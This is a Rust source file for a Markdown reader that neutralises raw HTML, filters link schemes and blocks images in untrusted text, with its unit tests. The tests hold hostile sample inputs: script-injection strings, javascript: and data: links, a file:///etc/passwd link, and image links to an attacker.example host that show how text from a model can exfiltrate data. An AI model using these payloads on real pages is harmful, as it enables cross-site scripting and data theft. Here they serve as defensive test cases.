//! # navree-markdown
//!
//! Markdown, read once and read safely, for every writer that draws it. The
//! UI toolkit draws it as elements, the API reference draws it as HTML for its
//! descriptions, and both get the same answer to the questions that matter:
//! what a link may point at, whether a picture may be shown, what raw HTML
//! becomes and how much text is read.
//!
//! [`Reader`] reads CommonMark (with tables, strikethrough and task lists) and
//! hands out [`Item`]s. A writer turns each item into its own output; it never
//! sees the parser's events, so it cannot forget a rule. What the reader
//! guarantees:
//!
//! - **No raw HTML.** An HTML block or tag in the text comes out as the text it
//!   is ([`Item::Text`]), for the writer to escape.
//! - **Links are checked.** Only `http`, `https`, `mailto`, `tel`, a path, a query
//!   or a fragment make a link; anything else keeps its words and loses the link.
//!   A link to another site says so ([`Link::off_site`]) and, in untrusted text,
//!   carries its host and `nofollow`, so a link that says one thing and goes to
//!   another can be seen.
//! - **Pictures are a decision.** Untrusted text never draws one: a picture in
//!   text from a model is a way to send what it knows to another site. Trusted
//!   text may draw pictures from this site (a path) and nowhere else.
//! - **Nothing grows without a bound.** The text is cut at [`MAX_BYTES`] and
//!   nesting stops at [`MAX_DEPTH`]: containers past it are left out and their
//!   content joins the one below. Every [`Item::Start`] has its [`Item::End`].
//!
//! ```
//! use navree_markdown::{Item, Kind, Reader, Settings, Tag};
//!
//! let items: Vec<Item> = Reader::new("**Hi** <script>", Settings::default()).collect();
//! assert_eq!(items[0], Item::Start(Tag::Paragraph));
//! assert_eq!(items[1], Item::Start(Tag::Strong));
//! assert_eq!(items[2], Item::Text("Hi".into()));
//! assert_eq!(items[3], Item::End(Kind::Strong));
//! // The tag is text: nothing here is markup.
//! assert!(items.contains(&Item::Text("<script>".into())));
//! ```
#![forbid(unsafe_code)]
#![cfg_attr(docsrs, feature(doc_cfg))]

mod link;

use std::borrow::Cow;

use pulldown_cmark::{Alignment, CodeBlockKind, Event, Options, Parser, Tag as Open, TagEnd};

/// The most Markdown text that is read. A longer text is cut at a character boundary,
/// and the reader ends with [`Item::Cut`].
pub const MAX_BYTES: usize = 256 * 1024;

/// How deep lists, quotes, tables and emphasis nest before the rest is flattened.
pub const MAX_DEPTH: usize = 24;

/// How far the text is trusted.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub enum Trust {
    /// Text from a model, a visitor or anyone you do not control. No picture is
    /// drawn, and a link to another site carries its host and `nofollow`.
    #[default]
    Untrusted,
    /// Text your own authors wrote. Pictures from this site are drawn, and links
    /// to other sites are marked no further than being off-site.
    Trusted,
}

/// What the reader is told about the text.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct Settings {
    /// How far the text is trusted.
    pub trust: Trust,
    /// The most bytes of text that is read (never more than [`MAX_BYTES`]).
    pub max_bytes: usize,
}

impl Default for Settings {
    fn default() -> Self {
        Self {
            trust: Trust::Untrusted,
            max_bytes: MAX_BYTES,
        }
    }
}

impl Settings {
    /// Settings for text your own authors wrote.
    #[must_use]
    pub fn trusted() -> Self {
        Self {
            trust: Trust::Trusted,
            ..Self::default()
        }
    }
}

/// The way a table column is aligned.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Align {
    /// No alignment was written.
    None,
    /// Toward the start of the line (left in a left-to-right script).
    Start,
    /// Centred.
    Center,
    /// Toward the end of the line (right in a left-to-right script).
    End,
}

/// A link the reader kept: its address passed the rules above.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Link {
    /// The address, as written (trimmed).
    pub href: String,
    /// The title, when one was written.
    pub title: Option<String>,
    /// Whether the link leaves this site: it names a host, with a scheme or with
    /// `//`, `/\` or `\\` (which browsers read as `//`). A `mailto:` or `tel:` link
    /// does not.
    pub off_site: bool,
    /// The host an off-site link in untrusted text goes to, for the reader of the
    /// page to see: no scheme, no user name, no path.
    pub host: Option<String>,
    /// Whether an off-site link in untrusted text should tell search engines not to
    /// follow it.
    pub nofollow: bool,
}

/// A picture in the text. The writer draws it when [`src`](Self::src) is set and
/// shows [`alt`](Self::alt) when it is not.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Image {
    /// The address, only for trusted text and only when it is on this site.
    pub src: Option<String>,
    /// The words written for the picture, as plain text.
    pub alt: String,
    /// The title, when one was written.
    pub title: Option<String>,
}

/// A block of code, whole.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct CodeBlock {
    /// The first word of the fence's info string, held to the characters a language
    /// name has (see [`clean_language`]). Empty for an indented block.
    pub language: String,
    /// The code, as written.
    pub code: String,
}

/// A container that opens. Its [`Kind`] closes it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Tag {
    /// A paragraph.
    Paragraph,
    /// A heading, `1` to `6` as many `#` as were written.
    Heading(u8),
    /// A block quote.
    Quote,
    /// An HTML block in the text. Its lines follow as [`Item::Text`].
    RawHtml,
    /// A list; an ordered one carries its first number.
    List(Option<u64>),
    /// A list item.
    ListItem,
    /// A table.
    Table,
    /// The header row of a table: its cells follow.
    TableHead,
    /// A row of a table.
    TableRow,
    /// A cell of a table.
    Cell {
        /// Whether it is in the header row.
        header: bool,
        /// How its column is aligned.
        align: Align,
    },
    /// Emphasis.
    Emphasis,
    /// Strong emphasis.
    Strong,
    /// Struck-through text.
    Strikethrough,
    /// A link that passed the rules.
    Link(Link),
    /// Any other container the parser knows. The writer may treat it as a block.
    Other,
}

impl Tag {
    /// What closes this container.
    #[must_use]
    pub fn kind(&self) -> Kind {
        match self {
            Self::Paragraph => Kind::Paragraph,
            Self::Heading(_) => Kind::Heading,
            Self::Quote => Kind::Quote,
            Self::RawHtml => Kind::RawHtml,
            Self::List(_) => Kind::List,
            Self::ListItem => Kind::ListItem,
            Self::Table => Kind::Table,
            Self::TableHead => Kind::TableHead,
            Self::TableRow => Kind::TableRow,
            Self::Cell { .. } => Kind::Cell,
            Self::Emphasis => Kind::Emphasis,
            Self::Strong => Kind::Strong,
            Self::Strikethrough => Kind::Strikethrough,
            Self::Link(_) => Kind::Link,
            Self::Other => Kind::Other,
        }
    }
}

/// The kind of a container, as [`Item::End`] names the one that closes.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Kind {
    /// [`Tag::Paragraph`].
    Paragraph,
    /// [`Tag::Heading`].
    Heading,
    /// [`Tag::Quote`].
    Quote,
    /// [`Tag::RawHtml`].
    RawHtml,
    /// [`Tag::List`].
    List,
    /// [`Tag::ListItem`].
    ListItem,
    /// [`Tag::Table`].
    Table,
    /// [`Tag::TableHead`].
    TableHead,
    /// [`Tag::TableRow`].
    TableRow,
    /// [`Tag::Cell`].
    Cell,
    /// [`Tag::Emphasis`].
    Emphasis,
    /// [`Tag::Strong`].
    Strong,
    /// [`Tag::Strikethrough`].
    Strikethrough,
    /// [`Tag::Link`].
    Link,
    /// [`Tag::Other`].
    Other,
}

/// One thing the text says.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Item<'a> {
    /// A container opens. The matching [`End`](Self::End) follows.
    Start(Tag),
    /// The innermost open container closes.
    End(Kind),
    /// Text. Raw HTML in the source arrives here too: it is text, to be escaped.
    Text(Cow<'a, str>),
    /// Inline code.
    Code(Cow<'a, str>),
    /// A line break inside a paragraph that is not a break in the output.
    SoftBreak,
    /// A line break that is one.
    HardBreak,
    /// A horizontal rule.
    Rule,
    /// The box of a task list item, done or not.
    Task(bool),
    /// A block of code, whole.
    CodeBlock(CodeBlock),
    /// A picture.
    Image(Image),
    /// The text was cut at the limit and the rest was not read. It is the last item.
    Cut,
}

impl Item<'_> {
    /// The item with its text owned, for a caller that keeps it past the text it was read
    /// from.
    #[must_use]
    pub fn into_owned(self) -> Item<'static> {
        match self {
            Self::Start(tag) => Item::Start(tag),
            Self::End(kind) => Item::End(kind),
            Self::Text(text) => Item::Text(Cow::Owned(text.into_owned())),
            Self::Code(text) => Item::Code(Cow::Owned(text.into_owned())),
            Self::SoftBreak => Item::SoftBreak,
            Self::HardBreak => Item::HardBreak,
            Self::Rule => Item::Rule,
            Self::Task(done) => Item::Task(done),
            Self::CodeBlock(block) => Item::CodeBlock(block),
            Self::Image(image) => Item::Image(image),
            Self::Cut => Item::Cut,
        }
    }
}

/// Reads Markdown, item by item.
///
/// It is an iterator and does its work as the writer asks for items: text that is
/// never drawn past the limit is never parsed.
pub struct Reader<'a> {
    parser: Parser<'a>,
    trust: Trust,
    cut: bool,
    depth: usize,
    overflow: usize,
    /// The language and text of a code block being read.
    code: Option<(String, String)>,
    /// For each open link, whether it kept a container (a link that failed the rules
    /// did not).
    links: Vec<bool>,
    image: Option<ImageRead>,
    aligns: Vec<Alignment>,
    column: usize,
    in_head: bool,
}

/// A picture being read: its text arrives as events before it is whole.
struct ImageRead {
    /// How many pictures are open inside this one.
    nested: usize,
    src: Option<String>,
    title: Option<String>,
    alt: String,
}

impl<'a> Reader<'a> {
    /// Reads `text` under `settings`.
    #[must_use]
    pub fn new(text: &'a str, settings: Settings) -> Self {
        let (text, cut) = limited(text, settings.max_bytes);
        let mut options = Options::empty();
        options.insert(Options::ENABLE_TABLES);
        options.insert(Options::ENABLE_STRIKETHROUGH);
        options.insert(Options::ENABLE_TASKLISTS);
        Self {
            parser: Parser::new_ext(text, options),
            trust: settings.trust,
            cut,
            depth: 0,
            overflow: 0,
            code: None,
            links: Vec::new(),
            image: None,
            aligns: Vec::new(),
            column: 0,
            in_head: false,
        }
    }

    fn event(&mut self, event: Event<'a>) -> Option<Item<'a>> {
        if self.image.is_some() {
            return self.in_image(event);
        }
        match event {
            Event::Start(tag) => self.start(tag),
            Event::End(end) => self.end(end),
            // Raw HTML is text: it shows as the characters it is.
            Event::Text(text) | Event::Html(text) | Event::InlineHtml(text) => {
                match &mut self.code {
                    Some((_, buffer)) => {
                        buffer.push_str(&text);
                        None
                    }
                    None => Some(Item::Text(text.into())),
                }
            }
            Event::Code(text) => Some(Item::Code(text.into())),
            Event::SoftBreak => Some(Item::SoftBreak),
            Event::HardBreak => Some(Item::HardBreak),
            Event::Rule => Some(Item::Rule),
            Event::TaskListMarker(done) => Some(Item::Task(done)),
            _ => None,
        }
    }

    /// The events inside a picture: its words are its alt text, and nothing else of
    /// it is drawn.
    fn in_image(&mut self, event: Event<'a>) -> Option<Item<'a>> {
        let image = self.image.as_mut()?;
        match event {
            Event::Start(Open::Image { .. }) => image.nested += 1,
            Event::End(TagEnd::Image) => {
                if image.nested > 0 {
                    image.nested -= 1;
                } else {
                    let done = self.image.take()?;
                    return Some(Item::Image(Image {
                        src: done.src,
                        alt: done.alt,
                        title: done.title,
                    }));
                }
            }
            Event::Text(text) | Event::Code(text) | Event::Html(text) | Event::InlineHtml(text) => {
                image.alt.push_str(&text)
            }
            Event::SoftBreak => image.alt.push('\n'),
            _ => {}
        }
        None
    }

    fn start(&mut self, tag: Open<'a>) -> Option<Item<'a>> {
        let tag = match tag {
            Open::Paragraph => Tag::Paragraph,
            Open::Heading { level, .. } => Tag::Heading(level as u8),
            Open::BlockQuote(_) => Tag::Quote,
            Open::CodeBlock(kind) => {
                let language = match kind {
                    CodeBlockKind::Fenced(info) => clean_language(&info),
                    CodeBlockKind::Indented => String::new(),
                };
                self.code = Some((language, String::new()));
                return None;
            }
            Open::HtmlBlock => Tag::RawHtml,
            Open::List(first) => Tag::List(first),
            Open::Item => Tag::ListItem,
            Open::Table(aligns) => {
                self.aligns = aligns;
                self.column = 0;
                Tag::Table
            }
            Open::TableHead => {
                self.in_head = true;
                self.column = 0;
                Tag::TableHead
            }
            Open::TableRow => {
                self.column = 0;
                Tag::TableRow
            }
            Open::TableCell => {
                let align = match self.aligns.get(self.column) {
                    Some(Alignment::Left) => Align::Start,
                    Some(Alignment::Center) => Align::Center,
                    Some(Alignment::Right) => Align::End,
                    _ => Align::None,
                };
                self.column += 1;
                Tag::Cell {
                    header: self.in_head,
                    align,
                }
            }
            Open::Emphasis => Tag::Emphasis,
            Open::Strong => Tag::Strong,
            Open::Strikethrough => Tag::Strikethrough,
            Open::Link {
                dest_url, title, ..
            } => match link::link(&dest_url, &title, self.trust) {
                Some(link) => {
                    self.links.push(true);
                    Tag::Link(link)
                }
                None => {
                    // The words stay and the link goes.
                    self.links.push(false);
                    return None;
                }
            },
            Open::Image {
                dest_url, title, ..
            } => {
                let src = match self.trust {
                    Trust::Trusted => link::image_source(&dest_url),
                    Trust::Untrusted => None,
                };
                self.image = Some(ImageRead {
                    nested: 0,
                    src,
                    title: (!title.is_empty()).then(|| title.into_string()),
                    alt: String::new(),
                });
                return None;
            }
            _ => Tag::Other,
        };
        if self.depth >= MAX_DEPTH {
            self.overflow += 1;
            return None;
        }
        self.depth += 1;
        Some(Item::Start(tag))
    }

    fn end(&mut self, end: TagEnd) -> Option<Item<'a>> {
        let kind = match end {
            TagEnd::Paragraph => Kind::Paragraph,
            TagEnd::Heading(_) => Kind::Heading,
            TagEnd::BlockQuote(_) => Kind::Quote,
            TagEnd::CodeBlock => {
                return self
                    .code
                    .take()
                    .map(|(language, code)| Item::CodeBlock(CodeBlock { language, code }));
            }
            TagEnd::HtmlBlock => Kind::RawHtml,
            TagEnd::List(_) => Kind::List,
            TagEnd::Item => Kind::ListItem,
            TagEnd::Table => Kind::Table,
            TagEnd::TableHead => {
                self.in_head = false;
                Kind::TableHead
            }
            TagEnd::TableRow => Kind::TableRow,
            TagEnd::TableCell => Kind::Cell,
            TagEnd::Emphasis => Kind::Emphasis,
            TagEnd::Strong => Kind::Strong,
            TagEnd::Strikethrough => Kind::Strikethrough,
            TagEnd::Link => {
                if !self.links.pop().unwrap_or(false) {
                    return None;
                }
                Kind::Link
            }
            // A picture is read whole, before its end reaches here.
            TagEnd::Image => return None,
            _ => Kind::Other,
        };
        if self.overflow > 0 {
            self.overflow -= 1;
            return None;
        }
        self.depth = self.depth.saturating_sub(1);
        Some(Item::End(kind))
    }
}

impl<'a> Iterator for Reader<'a> {
    type Item = Item<'a>;

    fn next(&mut self) -> Option<Item<'a>> {
        loop {
            match self.parser.next() {
                Some(event) => {
                    if let Some(item) = self.event(event) {
                        return Some(item);
                    }
                }
                None => {
                    if self.cut {
                        self.cut = false;
                        return Some(Item::Cut);
                    }
                    return None;
                }
            }
        }
    }
}

/// The text to read, and whether some was left out. It is cut at a character boundary.
fn limited(text: &str, max_bytes: usize) -> (&str, bool) {
    let max = max_bytes.min(MAX_BYTES);
    if text.len() <= max {
        return (text, false);
    }
    let mut end = max;
    while end > 0 && !text.is_char_boundary(end) {
        end -= 1;
    }
    (text.get(..end).unwrap_or_default(), true)
}

/// The first word of a fence's info string, held to the characters a language name has
/// and cut at 20 of them, in lower case. What a writer puts in an attribute or a caption
/// can't carry markup out of it.
///
/// ```
/// assert_eq!(navree_markdown::clean_language("Rust {.numbered}"), "rust");
/// assert_eq!(navree_markdown::clean_language("\"><script>"), "script");
/// ```
#[must_use]
pub fn clean_language(info: &str) -> String {
    info.trim()
        .split(|c: char| c.is_whitespace() || c == '{' || c == ',')
        .next()
        .unwrap_or_default()
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '#' | '.' | '-' | '_'))
        .take(20)
        .collect::<String>()
        .to_ascii_lowercase()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn read(text: &str) -> Vec<Item<'static>> {
        Reader::new(text, Settings::default())
            .map(Item::into_owned)
            .collect()
    }

    fn read_trusted(text: &str) -> Vec<Item<'static>> {
        Reader::new(text, Settings::trusted())
            .map(Item::into_owned)
            .collect()
    }

    /// The links the reader kept, in order.
    fn links(items: &[Item<'_>]) -> Vec<Link> {
        items
            .iter()
            .filter_map(|item| match item {
                Item::Start(Tag::Link(link)) => Some(link.clone()),
                _ => None,
            })
            .collect()
    }

    /// All the text, as a reader of the page would see it.
    fn words(items: &[Item<'_>]) -> String {
        items
            .iter()
            .map(|item| match item {
                Item::Text(text) | Item::Code(text) => text.to_string(),
                Item::Image(image) => image.alt.clone(),
                _ => String::new(),
            })
            .collect()
    }

    fn images(items: &[Item<'_>]) -> Vec<Image> {
        items
            .iter()
            .filter_map(|item| match item {
                Item::Image(image) => Some(image.clone()),
                _ => None,
            })
            .collect()
    }

    fn balanced(items: &[Item<'_>]) {
        let starts = items
            .iter()
            .filter(|item| matches!(item, Item::Start(_)))
            .count();
        let ends = items
            .iter()
            .filter(|item| matches!(item, Item::End(_)))
            .count();
        assert_eq!(starts, ends);
    }

    #[test]
    fn the_blocks_of_commonmark_come_out_as_containers() {
        let items = read("# Title\n\nA *word* and `code`.\n\n> quoted\n\n---\n\n1. one\n\n- a\n");
        assert!(items.contains(&Item::Start(Tag::Heading(1))));
        assert!(items.contains(&Item::Start(Tag::Emphasis)));
        assert!(items.contains(&Item::Code("code".into())));
        assert!(items.contains(&Item::Start(Tag::Quote)));
        assert!(items.contains(&Item::Rule));
        assert!(items.contains(&Item::Start(Tag::List(Some(1)))));
        assert!(items.contains(&Item::Start(Tag::List(None))));
        balanced(&items);
    }

    #[test]
    fn raw_html_is_text() {
        let items = read("hi <script>alert(1)</script>\n\n<div onclick=\"x()\">block</div>\n");
        let text = words(&items);
        assert!(text.contains("<script>alert(1)</script>"), "{text}");
        assert!(text.contains("<div onclick=\"x()\">block</div>"), "{text}");
        assert!(items.contains(&Item::Start(Tag::RawHtml)));
        balanced(&items);
    }

    #[test]
    fn a_link_with_a_bad_address_keeps_its_words_and_loses_the_link() {
        for bad in [
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            "data:text/html;base64,PHNjcmlwdD4=",
            "vbscript:x",
            "file:///etc/passwd",
            "java\tscript:alert(1)",
            "&#106;avascript:alert(1)",
        ] {
            let items = read(&format!("[click me]({bad})"));
            assert!(links(&items).is_empty(), "{bad}: {items:?}");
            assert!(words(&items).contains("click me"), "{bad}: {items:?}");
            balanced(&items);
        }
    }

    #[test]
    fn an_empty_link_is_only_words() {
        let items = read("[nothing]()");
        assert!(links(&items).is_empty(), "{items:?}");
        assert!(words(&items).contains("nothing"));
    }

    #[test]
    fn a_link_to_another_site_says_so_and_untrusted_text_shows_its_host() {
        let items = read("[bank](https://secure-login.example.com/path?x=1)");
        let link = &links(&items)[0];
        assert_eq!(link.href, "https://secure-login.example.com/path?x=1");
        assert!(link.off_site);
        assert!(link.nofollow);
        assert_eq!(link.host.as_deref(), Some("secure-login.example.com"));
    }

    #[test]
    fn trusted_text_marks_an_off_site_link_and_nothing_more() {
        let items = read_trusted("[docs](https://navree.com/docs)");
        let link = &links(&items)[0];
        assert!(link.off_site);
        assert!(!link.nofollow);
        assert_eq!(link.host, None);
    }

    #[test]
    fn the_host_is_the_one_the_browser_goes_to() {
        for (url, host) in [
            ("https://google.com@evil.example/x", "evil.example"),
            ("https://user:pass@evil.example:8443/x", "evil.example"),
            ("https:/\\evil.example/x", "evil.example"),
            ("//evil.example/x", "evil.example"),
            ("HTTPS://EVIL.example", "evil.example"),
            ("https://evil.example?x=1", "evil.example"),
            ("https://evil.example#frag", "evil.example"),
        ] {
            let items = read(&format!("[x]({url})"));
            let link = &links(&items)[0];
            assert!(link.off_site, "{url}");
            assert_eq!(link.host.as_deref(), Some(host), "{url}");
        }
        // Backslashes are slashes to a browser, so these leave the site as well.
        for url in ["/\\evil.example/x", "\\\\evil.example/x"] {
            let items = read(&format!("[x](<{url}>)"));
            assert!(links(&items)[0].off_site, "{url}");
        }
    }

    #[test]
    fn links_on_this_site_and_mail_links_are_not_off_site() {
        for url in [
            "/deals/7",
            "../up",
            "#section",
            "?page=2",
            "mailto:gurpreet@example.com",
            "tel:+919876543210",
        ] {
            let items = read(&format!("[x]({url})"));
            let link = &links(&items)[0];
            assert_eq!(link.href, url);
            assert!(!link.off_site, "{url}");
            assert!(!link.nofollow && link.host.is_none(), "{url}");
        }
    }

    #[test]
    fn a_link_keeps_its_title() {
        let items = read("[x](/here \"The place\")");
        assert_eq!(links(&items)[0].title.as_deref(), Some("The place"));
    }

    #[test]
    fn untrusted_text_never_has_a_picture_to_draw() {
        for text in [
            "![secret](https://attacker.example/steal?data=abc)",
            "![x](/local.png)",
            "![x](data:image/png;base64,AAAA)",
            "![](https://attacker.example/pixel.gif)",
            "[![x](https://attacker.example/a.png)](https://example.com)",
        ] {
            let items = read(text);
            let pictures = images(&items);
            assert_eq!(pictures.len(), 1, "{text}");
            assert_eq!(pictures[0].src, None, "{text}");
            balanced(&items);
        }
        let items = read("![chart of sales](https://attacker.example/x.png)");
        assert_eq!(images(&items)[0].alt, "chart of sales");
    }

    #[test]
    fn trusted_text_draws_pictures_from_this_site_only() {
        let items = read_trusted("![Ludhiana store](/media/store.png \"The store\")");
        let picture = &images(&items)[0];
        assert_eq!(picture.src.as_deref(), Some("/media/store.png"));
        assert_eq!(picture.alt, "Ludhiana store");
        assert_eq!(picture.title.as_deref(), Some("The store"));
        for far in [
            "https://other.example/a.png",
            "//other.example/a.png",
            "/\\other.example/a.png",
            "data:image/png;base64,AAAA",
            "javascript:x",
            "",
        ] {
            let items = read_trusted(&format!("![x](<{far}>)"));
            assert_eq!(images(&items)[0].src, None, "{far}");
        }
    }

    #[test]
    fn the_words_of_a_picture_are_its_alt_text() {
        let items = read("![a *very* `big` one](/x.png)");
        assert_eq!(images(&items)[0].alt, "a very big one");
        // A picture inside a picture does not end the outer one early.
        let items = read("![outer ![inner](/a.png) tail](/b.png) after");
        assert_eq!(images(&items).len(), 1, "{items:?}");
        assert!(words(&items).ends_with(" after"), "{items:?}");
    }

    #[test]
    fn a_task_list_item_says_whether_it_is_done() {
        let items = read("- [x] done\n- [ ] open\n");
        assert!(items.contains(&Item::Task(true)));
        assert!(items.contains(&Item::Task(false)));
    }

    #[test]
    fn a_table_says_which_cells_are_the_header_and_how_each_column_aligns() {
        let items = read("| Name | Amount |\n|:--|--:|\n| Harleen Kaur | 1,00,000 |\n");
        let cells: Vec<(bool, Align)> = items
            .iter()
            .filter_map(|item| match item {
                Item::Start(Tag::Cell { header, align }) => Some((*header, *align)),
                _ => None,
            })
            .collect();
        assert_eq!(
            cells,
            vec![
                (true, Align::Start),
                (true, Align::End),
                (false, Align::Start),
                (false, Align::End),
            ]
        );
        assert!(items.contains(&Item::Start(Tag::TableHead)));
        balanced(&items);
    }

    #[test]
    fn a_code_block_arrives_whole_with_a_clean_language() {
        let items = read("```Rust {.numbered}\nlet a = 1;\n```\n\n    indented\n");
        let blocks: Vec<&CodeBlock> = items
            .iter()
            .filter_map(|item| match item {
                Item::CodeBlock(block) => Some(block),
                _ => None,
            })
            .collect();
        assert_eq!(blocks.len(), 2);
        assert_eq!(blocks[0].language, "rust");
        assert_eq!(blocks[0].code, "let a = 1;\n");
        assert_eq!(blocks[1].language, "");
        assert_eq!(blocks[1].code, "indented\n");
    }

    #[test]
    fn a_hostile_language_name_keeps_only_the_characters_a_name_has() {
        let items = read("```\"><script>alert(1)</script>\ncode\n```\n");
        let Some(Item::CodeBlock(block)) =
            items.iter().find(|item| matches!(item, Item::CodeBlock(_)))
        else {
            panic!("no code block in {items:?}");
        };
        assert!(
            block
                .language
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '#' | '.' | '-' | '_')),
            "{}",
            block.language
        );
        assert!(block.language.len() <= 20);
    }

    #[test]
    fn a_text_past_the_limit_is_cut_at_a_character_and_the_last_item_says_so() {
        let text = "ਪੰਜਾਬ ".repeat(100);
        let items: Vec<Item<'_>> = Reader::new(
            &text,
            Settings {
                max_bytes: 101,
                ..Settings::default()
            },
        )
        .collect();
        assert_eq!(items.last(), Some(&Item::Cut));
        assert_eq!(items.iter().filter(|item| **item == Item::Cut).count(), 1);
        let whole = read("short");
        assert!(!whole.contains(&Item::Cut));
    }

    #[test]
    fn no_limit_goes_past_the_most() {
        let text = "x".repeat(MAX_BYTES + 10);
        let items: Vec<Item<'_>> = Reader::new(
            &text,
            Settings {
                max_bytes: usize::MAX,
                ..Settings::default()
            },
        )
        .collect();
        assert_eq!(items.last(), Some(&Item::Cut));
        assert_eq!(words(&items).len(), MAX_BYTES);
    }

    #[test]
    fn nesting_stops_at_a_depth_and_the_rest_is_flattened() {
        let deep = format!("{}deep", "> ".repeat(500));
        let items = read(&deep);
        assert!(words(&items).contains("deep"), "{items:?}");
        let quotes = items
            .iter()
            .filter(|item| **item == Item::Start(Tag::Quote))
            .count();
        assert!(quotes <= MAX_DEPTH, "{quotes}");
        balanced(&items);

        let lists = format!("{}x", "- ".repeat(300));
        let items = read(&lists);
        assert!(words(&items).contains('x'));
        let opened = items
            .iter()
            .filter(|item| matches!(item, Item::Start(Tag::List(None))))
            .count();
        assert!(opened <= MAX_DEPTH, "{opened}");
        balanced(&items);
    }

    #[test]
    fn hostile_text_neither_panics_nor_stalls_and_stays_balanced() {
        let nasty = [
            "[".repeat(20_000),
            "*".repeat(20_000),
            "`".repeat(20_000),
            "<".repeat(20_000),
            "![".repeat(10_000),
            "| a |\n|---|\n".repeat(2000),
            "\0\u{202e}\r\n".repeat(5000),
            "[a](".repeat(5000),
            "```\n".repeat(5000),
            "# ".repeat(10_000),
        ];
        for text in &nasty {
            let items = read(text);
            balanced(&items);
        }
    }
}
